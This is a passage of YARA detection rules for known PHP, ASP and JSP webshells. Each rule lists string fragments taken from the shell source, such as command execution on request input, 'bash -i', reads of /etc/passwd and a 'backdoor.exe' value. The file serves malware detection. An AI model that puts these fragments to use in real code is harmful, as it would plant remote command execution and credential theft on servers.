        fingerprint = "v1_sha256_f46b84d51077f157c83cd01534dfe7f9cd0d9ef04ad9935ced22d2abc873c171"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file 529.php"
        category = "INFO"
        hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"

    strings:
        $s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
        $s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
        $s9 = "echo '<PRE><P>This is exploit from <a " fullword
        $s10 = "This Exploit Was Edited By KingDefacer" fullword
        $s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
        $s14 = "$hardstyle = explode(\"/\", $file); " fullword
        $s20 = "while($level--) chdir(\"..\"); " fullword
    condition:
        2 of them
}
rule WebShell_STNC_WebShell_v0_8 {
    meta:
        id = "6BhagDi5c5KtogwQ2YeWGq"
        fingerprint = "v1_sha256_c2067a1b78c441aa05366b612090e0df895c621843038cc9e65beb6719c0cb9a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
        category = "INFO"
        hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"

    strings:
        $s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
        $s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
        $s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"
    condition:
        2 of them
}
rule WebShell_php_webshells_tryag {
    meta:
        id = "7dmkMa4xFFxm9QRS6Puvjw"
        fingerprint = "v1_sha256_2af3bbe8d1940e60843f3f5d40c9c6550e76df21568c374f7a871f73aeefae44"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file tryag.php"
        category = "INFO"
        hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"

    strings:
        $s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
        $s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
        $s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
        $s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
        $s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
    condition:
        3 of them
}
rule WebShell_dC3_Security_Crew_Shell_PRiV_2 {
    meta:
        id = "7G0gDSCkARbgnSpj2VCsfc"
        fingerprint = "v1_sha256_52dc0449c205ff9105e2dedc3cb4858f83a2efc7bae579656a26da493dc59500"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
        category = "INFO"
        hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"

    strings:
        $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
        $s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
        $s13 = "header(\"Content-type: image/gif\");" fullword
        $s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
        $s20 = "if (isset($_GET['rename_all'])) {" fullword
    condition:
        3 of them
}
rule WebShell_qsd_php_backdoor {
    meta:
        id = "739JQIoZGXEqIP7qaQnjoX"
        fingerprint = "v1_sha256_3ef7b67cd60370a99fdfa6fd614f71ee314af27c9d983383dde8f03a127a28b3"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
        category = "INFO"
        hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"

    strings:
        $s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
        $s2 = "if(isset($_POST[\"newcontent\"]))" fullword
        $s3 = "foreach($parts as $val)//Assemble the path back together" fullword
        $s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword
    condition:
        2 of them
}
rule WebShell_php_webshells_spygrup {
    meta:
        id = "6IhxrNpxW64kXVrFCBm0r"
        fingerprint = "v1_sha256_5981f8cc1a98f799b1573cf73297383f995acf1c40f0227ac10302dc4d6fd6cc"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file spygrup.php"
        category = "INFO"
        hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"

    strings:
        $s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
        $s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
        $s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
        $s18 = "By KingDefacer From Spygrup.org>" fullword
    condition:
        3 of them
}
rule WebShell_Web_shell__c_ShAnKaR {
    meta:
        id = "4BILoXOiMe81KjYiJNSqcy"
        fingerprint = "v1_sha256_9d320eed18a5d76a87cee4ea0fa9caf08f096f7eeaab55420540aa082b596e0f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
        category = "INFO"
        hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"

    strings:
        $s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
        $s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
        $s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
        $s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
    condition:
        2 of them
}
rule WebShell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz {
    meta:
        id = "3OPVzPIpvYyArxOlhrOgrZ"
        fingerprint = "v1_sha256_2d096baad162c0e3e01732007a3be2804155e614a8fa4cd2d5dd3a7ac808fb49"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
        category = "INFO"
        hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"

    strings:
        $s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
        $s11 = "directory... Trust me - it works :-) */" fullword
        $s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
        $s16 = "} else if ($command == 'ls') {" fullword
    condition:
        3 of them
}
rule WebShell_Gamma_Web_Shell {
    meta:
        id = "1p6oEvntC7dQ1qstBt4J6C"
        fingerprint = "v1_sha256_1de868c4948a95272d288aeba3ac38b84bf6b33ede6b3b600b32530c85586404"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
        category = "INFO"
        hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"

    strings:
        $s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
        $s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
        $s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
        $s20 = "my $command = $self->query('command');" fullword
    condition:
        2 of them
}
rule WebShell_php_webshells_aspydrv {
    meta:
        id = "1Z1dflktWdY2LjxE4ZIwCu"
        fingerprint = "v1_sha256_314fd671b163b9904cc78cb3a5858f5b1e3dfae9d520d5ebc545a7abd922e9f7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file aspydrv.php"
        category = "INFO"
        hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"

    strings:
        $s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
        $s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
        $s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
        $s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
        $s20 = "' ---Copy Too Folder routine Start" fullword
    condition:
        3 of them
}
rule WebShell_JspWebshell_1_2_2 {
    meta:
        id = "1xu0jSvCbM76jbLhprcJMz"
        fingerprint = "v1_sha256_41d937fce969a850a2e4e07eb168becc96a036317a78d620e812707be9466dfc"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
        category = "INFO"
        hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"

    strings:
        $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
        $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
        $s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
        $s15 = "endPoint=random1.getFilePointer();" fullword
        $s20 = "if (request.getParameter(\"command\") != null) {" fullword
    condition:
        3 of them
}
rule WebShell_g00nshell_v1_3 {
    meta:
        id = "3HPtE2TgdlToAxdMx6k9ri"
        fingerprint = "v1_sha256_2ecb3ce2aa43a99552fb26e610c35bdb04f4ff0dc75c867e4327d6e27eed0177"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
        category = "INFO"
        hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"

    strings:
        $s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
        $s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
        $s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
        $s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
        $s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
    condition:
        2 of them
}
rule WebShell_WinX_Shell {
    meta:
        id = "2GCJGk8tAENWvpiRVtfAPQ"
        fingerprint = "v1_sha256_f953c297763e41d197ce186dc818b656951dfa8c855c5063fc4abb54eeefc7bb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file WinX Shell.php"
        category = "INFO"
        hash = "a94d65c168344ad9fa406d219bdf60150c02010e"

    strings:
        $s4 = "// It's simple shell for all Win OS." fullword
        $s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
        $s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
        $s13 = "// Created by greenwood from n57" fullword
        $s20 = " if (is_uploaded_file($userfile)) {" fullword
    condition:
        3 of them
}
rule WebShell_PHANTASMA {
    meta:
        id = "5KlbSUH8VArZNJ0zbRvex7"
        fingerprint = "v1_sha256_355be62807182f9a53bac20a6dead8f0a3bee83b6bdc4566502c157f16076b9b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file PHANTASMA.php"
        category = "INFO"
        hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"

    strings:
        $s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
        $s15 = "if ($portscan != \"\") {" fullword
        $s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
        $s20 = "$dono = get_current_user( );" fullword
    condition:
        3 of them
}
rule WebShell_php_webshells_cw {
    meta:
        id = "6zKTITu0pujBpFXBySXnDv"
        fingerprint = "v1_sha256_52bfb14f4d5d3df787ce7782cbbee25ea1556758eed48e3001c8a3f35a541526"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file cw.php"
        category = "INFO"
        hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"

    strings:
        $s1 = "// Dump Database [pacucci.com]" fullword
        $s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
        $s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
        $s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
        $s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
        $s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword
    condition:
        3 of them
}
rule WebShell_php_include_w_shell {
    meta:
        id = "1w0cenWyPascWt3PruiyJq"
        fingerprint = "v1_sha256_2be144060d4fdaee38214dc2eba80c2a6fd3699060d274e66356fd5a08c9be4b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file php-include-w-shell.php"
        category = "INFO"
        hash = "1a7f4868691410830ad954360950e37c582b0292"

    strings:
        $s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
        $s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
        $s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
    condition:
        1 of them
}
rule WebShell_mysql_tool {
    meta:
        id = "eFS1kxgBOPnUf8NRDMYpA"
        fingerprint = "v1_sha256_611636b3fa9a3163574b18cf8eacebea9733a1ad381261387f79a532b003e8fd"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file mysql_tool.php"
        category = "INFO"
        hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"

    strings:
        $s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
        $s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
    condition:
        2 of them
}
rule WebShell_PhpSpy_Ver_2006 {
    meta:
        id = "2gARpEkPuWXz2QpGGiqrPH"
        fingerprint = "v1_sha256_69bd2c387b0e676168116f3b3c3c081e08fd555cc6bc9a94b9c8ef97f194b09f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
        category = "INFO"
        hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"

    strings:
        $s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
        $s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
        $s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
        $s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
    condition:
        1 of them
}
rule WebShell_ZyklonShell {
    meta:
        id = "X0sk4H9uJnUv2lnATpuQb"
        fingerprint = "v1_sha256_5d49f2599781836156f6bbb0c50cfcffdb2ca51c7cb688abbc6245d7f856ad01"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file ZyklonShell.php"
        category = "INFO"
        hash = "3fa7e6f3566427196ac47551392e2386a038d61c"

    strings:
        $s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
        $s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
        $s2 = "<TITLE>404 Not Found</TITLE>" fullword
        $s3 = "<H1>Not Found</H1>" fullword
    condition:
        all of them
}
rule WebShell_php_webshells_myshell {
    meta:
        id = "1ZiHSgwSBfRcgSoirKv1Rg"
        fingerprint = "v1_sha256_7765e43189d6ec0cda0b58d00cfd7fc8cec89287dbac7487083b6ce1ce55f306"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file myshell.php"
        category = "INFO"
        hash = "5bd52749872d1083e7be076a5e65ffcde210e524"

    strings:
        $s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
        $s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
        $s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
        $s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"
    condition:
        1 of them
}
rule WebShell_php_webshells_lolipop {
    meta:
        id = "1uTMXOJPiQewTOjGIy2nf2"
        fingerprint = "v1_sha256_8b0dcf76a244f80d4bee0c62189df55c1f8d71cf0900cd8ebb5916f5fe972bed"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file lolipop.php"
        category = "INFO"
        hash = "86f23baabb90c93465e6851e40104ded5a5164cb"

    strings:
        $s3 = "$commander = $_POST['commander']; " fullword
        $s9 = "$sourcego = $_POST['sourcego']; " fullword
        $s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
    condition:
        all of them
}
rule WebShell_simple_cmd {
    meta:
        id = "1JU1vQSb1y5QXIHOdafZ4J"
        fingerprint = "v1_sha256_82a65f4bbdcd2fc626aa9f36fe530d19aa19a48389e970c26e525597818914ee"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file simple_cmd.php"
        category = "INFO"
        hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"

    strings:
        $s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
        $s2 = "<title>G-Security Webshell</title>" fullword
        $s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
        $s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
    condition:
        1 of them
}
rule WebShell_go_shell {
    meta:
        id = "5JSUB3IzdI7hyycJW8GI2v"
        fingerprint = "v1_sha256_f2fcefb9a0536c80fa74ceb002e113f95de53d1f56e22c81b542c395dd11071d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file go-shell.php"
        category = "INFO"
        hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"

    strings:
        $s0 = "#change this password; for power security - delete this file =)" fullword
        $s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
        $s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
        $s12 = "print << \"[kalabanga]\";" fullword
        $s13 = "<title>GO.cgi</title>" fullword
    condition:
        1 of them
}
rule WebShell_aZRaiLPhp_v1_0 {
    meta:
        id = "70iOnPizeZcR9hL1XYo0Y4"
        fingerprint = "v1_sha256_8309338bb327cc14ae5970bd921b3dba68353d55be31b9dbbc5374ded24ed563"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
        category = "INFO"
        hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"

    strings:
        $s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
        $s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
        $s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
        $s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
    condition:
        2 of them
}
rule WebShell_webshells_zehir4 {
    meta:
        id = "7dX5c0VYhV5tFduNDbbsAI"
        fingerprint = "v1_sha256_36b6940ffecd9be190cce62252ec7d87f1c0bc0d19b4442df63f4404eb316364"
        version = "1.0"
        score = 55
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Webshells Github Archive - file zehir4"
        category = "INFO"
        hash = "788928ae87551f286d189e163e55410acbb90a64"

    strings:
        $s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
        $s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
    condition:
        1 of them
}
rule WebShell_zehir4_asp_php {
    meta:
        id = "3x5RctzAE7R8ELQsRdQjP4"
        fingerprint = "v1_sha256_dfaf685ac3b364143bfbe289b05f066b09f01622fec3e9157f4b4791f7567619"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
        category = "INFO"
        hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"

    strings:
        $s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
        $s11 = "frames.byZehir.document.execCommand("
        $s15 = "frames.byZehir.document.execCommand(co"
    condition:
        2 of them
}
rule WebShell_php_webshells_lostDC {
    meta:
        id = "2lpAfMInlAZ5GA8H6iMSv2"
        fingerprint = "v1_sha256_e3cd28f4a72f5a8a92c728fe76a7159c28256e87daf4c1dd10190a57263f5b45"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file lostDC.php"
        category = "INFO"
        hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"

    strings:
        $s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
        $s4 = "header ( \"Content-Description: Download manager\" );" fullword
        $s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
        $s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
        $s12 = "$ret = shellexec($command);" fullword
    condition:
        2 of them
}
rule WebShell_CasuS_1_5 {
    meta:
        id = "rrD7XitJvaopd6CV4bUj9"
        fingerprint = "v1_sha256_0dbaa39bd33047d24e5bc9716108c5581da3f54e93d90f9c550b3d84de1ebfe2"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file CasuS 1.5.php"
        category = "INFO"
        hash = "7eee8882ad9b940407acc0146db018c302696341"

    strings:
        $s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
        $s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
        $s18 = "if (file_exists(\"F:\\\\\")){" fullword
    condition:
        1 of them
}
rule WebShell_ftpsearch {
    meta:
        id = "1gpzw4XFJdij1976oz4rFg"
        fingerprint = "v1_sha256_6b32553be4fdf26776e3cbb8a5d4d011d88f2bd50949b65934df72b89065aeec"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - file ftpsearch.php"
        category = "INFO"
        hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"

    strings:
        $s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
        $s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
        $s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
        $s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword
    condition:
        2 of them
}
rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0_ {
    meta:
        id = "4JNVVsWuV6kkJzmDuIB4Uy"
        fingerprint = "v1_sha256_fc2cf9a25ccc5aa3d9dc287ef9600b065ba9025cfb0a1ccca1bce9120ea03ff4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
        category = "INFO"
        super_rule = 1
        hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
        hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
        hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"

    strings:
        $s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
        $s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
        $s11 = " *   Coded by Pixcher" fullword
        $s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
    condition:
        2 of them
}
rule WebShell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_soldierofallah {
    meta:
        id = "2spLXDXOVToxkbi8bPycBN"
        fingerprint = "v1_sha256_0b9e0d96c8a618a4883235e8c5c9a03a1e0b586cb4b30e0273e24c35ee5ee502"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
        category = "INFO"
        super_rule = 1
        hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
        hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
        hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"

    strings:
        $s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
        $s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
        $s3 = "$dt = $_POST['filecontent'];" fullword
        $s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
        $s6 = "print \"Sorry, none of the command functions works.\";" fullword
        $s11 = "document.cmdform.command.value='';" fullword
        $s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
    condition:
        3 of them
}
rule WebShell_Generic_PHP_7 {
    meta:
        id = "11SwHsjJieIgv1bnmsPsLe"
        fingerprint = "v1_sha256_9d9b6b1333f2061c357fad110b5cc508288c70aea1212aa2fcbf283a2ce4fb2c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Mysql interface v1.0.php, MySQL Web Interface Version 0.8.php, Mysql_interface_v1.0.php, MySQL_Web_Interface_Version_0.8.php"
        category = "INFO"
        super_rule = 1
        hash0 = "de98f890790756f226f597489844eb3e53a867a9"
        hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
        hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
        hash3 = "715f17e286416724e90113feab914c707a26d456"

    strings:
        $s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
        $s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
        $s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
        $s4 = "if( $action == \"dumpTable\" )" fullword
    condition:
        2 of them
}
rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall {
    meta:
        id = "7VMhOQTVKnAON1HkEeEMu9"
        fingerprint = "v1_sha256_840c58043e39014e90e7621c1d2417d5a970c744560738abc4fea3db3cbb8d5a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
        category = "INFO"
        super_rule = 1
        hash0 = "b148ead15d34a55771894424ace2a92983351dda"
        hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
        hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
        hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"

    strings:
